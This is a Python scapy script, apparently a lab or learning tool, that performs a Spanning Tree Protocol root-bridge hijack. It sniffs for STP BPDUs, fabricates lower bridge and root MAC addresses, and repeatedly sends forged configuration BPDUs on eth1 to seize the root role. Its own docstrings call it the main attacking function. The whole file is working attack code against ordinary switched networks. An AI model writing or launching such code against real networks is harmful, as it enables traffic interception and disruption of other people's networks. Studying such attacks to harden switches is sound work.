import sys

from scapy.layers.l2 import STP, Dot3, LLC
from scapy.all import *

def Stop_filter(stop):
    """
    Function to Stop the Sniffing if STP is Identified inside a packet
    :param stop: Sniffed Packet
    :return:
    """
    if stop.haslayer(STP):
        return True
    else:
        return False



def Lower_MAC(mac):
    """
    Function To Lower The Root MAC And The Bridge MAC To gain Root Role
    :param mac:
    :return:
    """
    EvilMAC = ""
    count = 0
    Flag = False
    for x in range(len(mac)):
        if mac[x] in "abcdef123456789" and not Flag:
            count+=1
            repl = int(mac[x], 16)
            repl -= 1
            repl = format(repl, "x")
            EvilMAC = EvilMAC + str(repl)
            if count >2:
                Flag=True
        else:
            EvilMAC+=mac[x]
    return  EvilMAC



def Claim_Root(i_face):
    """
    Main Attacking Function
    :param i_face: Interface To Launch Attack ON
    :return:
    """
    # Sniffing Packet If the Paket Contains STP Stop Sniffing
    sniffed_packet = sniff(stop_filter = Stop_filter, iface="eth1")
    print(sniffed_packet.show())

    # .sessions() gives the dictionary format of captured packet
    # Changing into list and Searching for "Other" Flag
    key, value = list(sniffed_packet.sessions().items())[0]
    # If Other Flag is present search for STP field inside the Packet
    if key == "Other":
        for pkt_content in value:
            # If STP is Present inside the fields of Packet
            # This will be our attraction and target
            if STP in pkt_content:
                Main_Packet = pkt_content

    RootMAC = Main_Packet.rootmac
    BridgeMAC = Main_Packet.bridgemac
    RootID = Main_Packet.rootid
    BridgeID = Main_Packet.bridgeid

    # New MAC Addresses generated lowering the first three non zeros hex
    NewBridgeMAC = Lower_MAC(BridgeMAC)
    NewRootMAC = Lower_MAC(RootMAC)


    new_packet = (
            Dot3(dst="01:80:c2:00:00:00", src=NewBridgeMAC) /
            LLC() /
            STP(bpdutype=0x00, bpduflags=0x01, portid=0x8002, rootmac=NewRootMAC, bridgemac=NewBridgeMAC,
               rootid=RootID, bridgeid=BridgeID)
        )
    # print(new_packet.show())

    Launch(new_packet, NewBridgeMAC, NewRootMAC, RootID, BridgeID, i_face)

def Launch(feed_packet, NewBridgeMAC, NewRootMAC, RootID, BridgeID,  i_face):
    """
    Function TO Check If The Return Packet Is From Previous Root or Not
    :param feed_packet: Crafted Packet with lower Bridge and Root MAC which is Flagged as a Configuration Packet
    :param NewBridgeMAC: Modified Lower MAC of Bridge
    :param NewRootMAC: Modified Lower MAC of Root
    :param RootID: Root ID
    :param BridgeID: Bridge ID
    :param i_face: Interface To Launch Attack ON
    :return:
    """
    try:
        while True:
            TCN = srp1(feed_packet, iface="eth1", verbose=0, timeout=2)
            if TCN is not None:
                if STP in TCN:
                    if TCN[Dot3].src != NewRootMAC:
                        craft = (
                            Dot3(dst="01:80:c2:00:00:00", src=NewBridgeMAC) /
                            LLC() /
                            STP(bpdutype=0x00, bpduflags=0x81, portid=0x8002, rootmac=NewRootMAC, bridgemac=NewBridgeMAC,
                                rootid=RootID, bridgeid=BridgeID)
                        )
                        sendp(craft, iface = "eth1", verbose=False)
    except KeyboardInterrupt:
        exit()


# Claim_Root("eth1")